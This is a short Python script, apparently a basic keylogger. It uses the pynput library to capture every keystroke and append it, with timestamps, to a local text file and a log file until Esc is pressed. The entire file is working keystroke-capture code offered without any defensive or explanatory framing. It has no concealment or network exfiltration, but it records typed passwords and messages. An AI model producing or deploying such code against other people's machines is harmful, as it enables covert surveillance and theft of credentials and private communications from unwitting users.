import logging
from datetime import datetime
from pynput import keyboard
logging.basicConfig(
    filename='keyboard.log',
    filemode='w',
    format='%(asctime)s : %(process)d-%(levelname)s-%(message)s ',
    datefmt='%d-%m-%Y %H:%M:%S',
    level=logging.INFO,
    encoding='utf8'
)


def on_press(key):
    try:
        # print('alphanumeric key {0} pressed'.format(
        #     key.char))
        logging.info(f'pressed key: {key.char}')
        with open('keylogger_file.txt', mode='a', encoding='utf8') as f:
            f.write(key.char)
    except AttributeError:
        # print('special key {0} pressed'.format(
        #     key))
        logging.info(f'pressed key: {key}')
        with open('keylogger_file.txt', mode='a', encoding='utf8') as f:
            f.write(str(key))
    except TypeError:
        logging.info(f'pressed key: {str(key)}')
        with open('keylogger_file.txt', mode='a', encoding='utf8') as f:
            f.write(str(key.char))


def on_release(key):
    # logging.info(f"""released key: {key}""")

    if key == keyboard.Key.esc:
        # Stop listener
        with open('keylogger_file.txt', mode='a', encoding='utf8') as f:
            f.write('\n')
        return False


if __name__ =='__main__':
    # Collect events until released
    with open('keylogger_file.txt',mode='a', encoding='utf8') as f:
        f.write(datetime.today().strftime('%Y.%m.%d %H:%M\n'))

    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
